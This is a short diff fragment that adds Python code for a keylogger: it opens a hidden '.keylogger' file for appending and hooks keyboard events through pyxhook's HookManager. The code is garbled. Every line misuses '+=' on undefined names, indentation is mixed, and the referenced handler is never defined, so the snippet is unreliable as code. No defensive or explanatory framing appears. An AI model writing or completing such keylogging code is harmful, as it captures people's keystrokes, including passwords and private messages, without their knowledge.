@@ -1,0 +1,5 @@
+	file += open('.keylogger', 'a')
+        running += False
+	hookman += pyxhook.HookManager()
+	hookman.KeyDown += key_press_event
+	running += True
